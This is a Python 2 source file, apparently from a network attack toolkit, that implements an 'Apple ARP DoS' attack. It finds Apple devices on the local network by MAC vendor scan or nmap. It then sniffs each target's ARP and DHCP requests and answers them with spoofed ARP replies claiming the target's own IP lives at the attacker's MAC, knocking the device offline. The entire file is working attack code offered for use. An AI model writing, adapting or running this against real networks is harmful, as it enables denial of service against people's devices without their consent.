#!/usr/bin/env python

# region Import
from sys import path
from os.path import dirname, abspath
project_root_path = dirname(dirname(dirname(abspath(__file__))))
utils_path = project_root_path + "/Utils/"
scripts_arp_path = project_root_path + "/Scripts/ARP"

path.append(utils_path)
path.append(scripts_arp_path)

from base import Base
from scanner import Scanner
from network import Ethernet_raw, ARP_raw, IP_raw, UDP_raw, DHCP_raw
from tm import ThreadManager
from arp_scan import ArpScan
from argparse import ArgumentParser
from ipaddress import IPv4Address
from socket import socket, AF_PACKET, SOCK_RAW, htons
from time import sleep
# endregion

# region Check user, platform and print banner
Base = Base()
Scanner = Scanner()
ArpScan = ArpScan()

eth = Ethernet_raw()
arp = ARP_raw()
ip = IP_raw()
udp = UDP_raw()
dhcp = DHCP_raw()

Base.check_user()
Base.check_platform()
Base.print_banner()
# endregion

# region Parse script arguments
parser = ArgumentParser(description='Apple ARP DoS script')
parser.add_argument('-i', '--iface', type=str, help='Set interface name for send ARP packets')
parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
parser.add_argument('-s', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection')
args = parser.parse_args()
# endregion

# region Set global variables
apple_devices = []
apple_device = []
target_ip = None
# endregion

# region Get listen network interface, your IP and MAC address, first and last IP in local network
if args.iface is None:
    Base.print_warning("Please set a network interface for sniffing ARP and DHCP requests ...")
listen_network_interface = Base.netiface_selection(args.iface)

your_mac_address = Base.get_netiface_mac_address(listen_network_interface)
if your_mac_address is None:
    print Base.c_error + "Network interface: " + listen_network_interface + " do not have MAC address!"
    exit(1)

your_ip_address = Base.get_netiface_ip_address(listen_network_interface)
if your_ip_address is None:
    Base.print_error("Network interface: ", listen_network_interface, " does not have IP address!")
    exit(1)

first_ip = Base.get_netiface_first_ip(listen_network_interface)
last_ip = Base.get_netiface_last_ip(listen_network_interface)
# endregion

# region Create global raw socket
socket_global = socket(AF_PACKET, SOCK_RAW)
socket_global.bind((listen_network_interface, 0))
# endregion

# region General output
Base.print_info("Listen network interface: ", listen_network_interface)
Base.print_info("Your IP address: ", your_ip_address)
Base.print_info("Your MAC address: ", your_mac_address)
Base.print_info("First ip address: ", first_ip)
Base.print_info("Last ip address: ", last_ip)
# endregion

# region Check target IP and new IP addresses
if args.target_ip is not None:
    if Base.ip_address_validation(args.target_ip):
        if IPv4Address(unicode(first_ip)) <= IPv4Address(unicode(args.target_ip)) <= IPv4Address(unicode(last_ip)):
            target_ip = args.target_ip
            Base.print_info("Target IP address: ", target_ip)
        else:
            Base.print_error("Target IP address: ", args.target_ip, " not in range: ", first_ip + " ... " + last_ip)
            exit(1)
    else:
        Base.print_error("Wrong target IP address: ", args.target_ip)
        exit(1)
# endregion


# region ARP reply sender
def send_arp_reply():
    arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
                                  ethernet_dst_mac=apple_device[1],
                                  sender_mac=your_mac_address, sender_ip=apple_device[0],
                                  target_mac=apple_device[1], target_ip=apple_device[0])
    socket_global.send(arp_reply)
    Base.print_info("ARP response to:  ", apple_device[1], " \"",
                    apple_device[0] + " is at " + your_mac_address, "\"")
# endregion


# region Analyze request in sniffer
def reply(request):

    # region Define global variables
    global apple_device
    # endregion

    # region ARP request
    if 'ARP' in request.keys():
        if request['Ethernet']['destination'] == "ff:ff:ff:ff:ff:ff" and \
                request['ARP']['target-mac'] == "00:00:00:00:00:00" and \
                request['ARP']['target-ip'] == apple_device[0]:

                Base.print_info("ARP request from: ", request['Ethernet']['source'], " \"",
                                "Who has " + request['ARP']['target-ip'] +
                                "? Tell " + request['ARP']['sender-ip'], "\"")
                send_arp_reply()
    # endregion

    # region DHCP request
    if 'DHCP' in request.keys():
        if request['DHCP'][53] == 3:
            if 50 in request['DHCP'].keys():
                apple_device[0] = str(request['DHCP'][50])
                Base.print_success("DHCP REQUEST from: ", apple_device[1], " requested ip: ", apple_device[0])
    # endregion

# endregion


# region Sniff ARP and DHCP request from target
def sniffer():

    # region Create RAW socket for sniffing
    rawSocket = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
    # endregion

    # region Local variables
    ethernet_header_length = 14
    arp_packet_length = 28
    udp_header_length = 8
    # endregion

    # region Print info message
    Base.print_info("Waiting for ARP or DHCP REQUEST from ", apple_device[0] + " (" + apple_device[1] + ")")
    # endregion

    # region Start sniffing
    while True:

        # region Get packets from RAW socket
        packets = rawSocket.recvfrom(2048)

        for packet in packets:

            # region Get Ethernet header from packet
            ethernet_header = packet[0:ethernet_header_length]
            ethernet_header_dict = eth.parse_header(ethernet_header)
            # endregion

            # region Success parse Ethernet header
            if ethernet_header_dict is not None:

                # region Target MAC address is Set
                if apple_device[1] is not None:
                    if ethernet_header_dict['source'] != apple_device[1]:
                        break
                # endregion

                # region ARP packet

                # 2054 - Type of ARP packet (0x0806)
                if ethernet_header_dict['type'] == 2054:

                    # Get ARP packet
                    arp_header = packet[ethernet_header_length:ethernet_header_length + arp_packet_length]
                    arp_header_dict = arp.parse_packet(arp_header)

                    # Success ARP packet
                    if arp_header_dict is not None:

                        # ARP Opcode: 1 - ARP request
                        if arp_header_dict['opcode'] == 1:

                            # Create full request
                            request = {
                                "Ethernet": ethernet_header_dict,
                                "ARP": arp_header_dict
                            }

                            # Reply to this request
                            reply(request)

                # endregion

                # region DHCP packet

                # 2048 - Type of IP packet (0x0800)
                if ethernet_header_dict['type'] == 2048:

                    # Get IP header
                    ip_header = packet[ethernet_header_length:]
                    ip_header_dict = ip.parse_header(ip_header)

                    # Success parse IP header
                    if ip_header_dict is not None:

                        # UDP
                        if ip_header_dict['protocol'] == 17:

                            # Get UDP header offset
                            udp_header_offset = ethernet_header_length + (ip_header_dict['length'] * 4)

                            # Get UDP header
                            udp_header = packet[udp_header_offset:udp_header_offset + udp_header_length]
                            udp_header_dict = udp.parse_header(udp_header)

                            # Success parse UDP header
                            if udp_header is not None:
                                if udp_header_dict['source-port'] == 68 and udp_header_dict['destination-port'] == 67:

                                    # Get DHCP header offset
                                    dhcp_packet_offset = udp_header_offset + udp_header_length

                                    # Get DHCP packet
                                    dhcp_packet = packet[dhcp_packet_offset:]
                                    dhcp_packet_dict = dhcp.parse_packet(dhcp_packet)

                                    # Create full request
                                    request = {
                                        "Ethernet": ethernet_header_dict,
                                        "IP": ip_header_dict,
                                        "UDP": udp_header_dict
                                    }
                                    request.update(dhcp_packet_dict)

                                    # Reply to this request
                                    reply(request)

                # endregion

            # endregion

        # endregion

    # endregion

# endregion


# region Main function
if __name__ == "__main__":

    try:

        # region Find Apple devices in local network with ArpScan or nmap
        if args.target_ip is None:
            if not args.nmap_scan:
                Base.print_info("ARP scan is running ...")
                apple_devices = Scanner.find_apple_devices_by_mac(listen_network_interface)
            else:
                Base.print_info("NMAP scan is running ...")
                apple_devices = Scanner.find_apple_devices_with_nmap(listen_network_interface)

            apple_device = Scanner.apple_device_selection(apple_devices)
        # endregion

        # region Find Mac address of Apple device if target IP is set
        if args.target_ip is not None:
            Base.print_info("Find MAC address of Apple device with IP address: ", target_ip, " ...")
            target_mac = ArpScan.get_mac_address(listen_network_interface, target_ip)
            if target_mac == "ff:ff:ff:ff:ff:ff":
                Base.print_error("Could not find device MAC address with IP address: ", target_ip)
                exit(1)
            else:
                apple_device = [target_ip, target_mac]
        # endregion

        # region Print target IP and MAC address
        Base.print_info("Target: ", apple_device[0] + " (" + apple_device[1] + ")")
        # endregion

        # region Start sniffer
        tm = ThreadManager(2)
        tm.add_task(sniffer)
        # endregion

        # region Send first ARP reply
        sleep(5)
        Base.print_warning("Send first (init) ARP reply ...")
        send_arp_reply()
        # endregion

        # region Wait for completion
        tm.wait_for_completion()
        # endregion

    except KeyboardInterrupt:
        Base.print_info("Exit")
        exit(0)

# endregion
